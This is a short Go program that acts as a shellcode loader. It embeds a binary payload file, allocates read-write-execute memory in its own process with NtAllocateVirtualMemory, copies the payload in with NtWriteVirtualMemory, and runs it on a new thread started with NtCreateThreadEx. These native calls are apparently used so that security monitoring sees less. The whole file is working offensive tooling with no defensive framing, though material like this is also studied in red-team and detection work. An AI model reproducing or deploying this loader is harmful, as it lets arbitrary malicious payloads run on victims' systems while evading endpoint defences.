package main

import (
	_ "embed"
	"syscall"
)

//go:embed shellcode.bin
var shellcode []byte

func main() {
	const (
		thisThread = uintptr(0xffffffffffffffff) //special macro that says 'use this thread/process' when provided as a handle.
		memCommit  = uintptr(0x00001000)
		memreserve = uintptr(0x00002000)
	)

	var baseA uintptr
	regionsize := uint32(len(shellcode))
	NtAllocateVirtualMemory(thisThread,
		&baseA,
		0,
		&regionsize,
		uint32(memCommit|memreserve),
		syscall.PAGE_EXECUTE_READWRITE,
	)
	var written uintptr
	NtWriteVirtualMemory(thisThread, baseA, &shellcode[0], uintptr(len(shellcode)), &written)

	var hhosthread uintptr
	NtCreateThreadEx( //NtCreateThreadEx
		&hhosthread, //hthread
		0x1FFFFF,    //desiredaccess
		0,           //objattributes
		thisThread,  //processhandle
		baseA,       //lpstartaddress
		0,           //lpparam
		uintptr(0),  //createsuspended
		0,           //zerobits
		0,           //sizeofstackcommit
		0,           //sizeofstackreserve
		0,           //lpbytesbuffer
	)
	syscall.WaitForSingleObject(syscall.Handle(hhosthread), 0xffffffff)

}
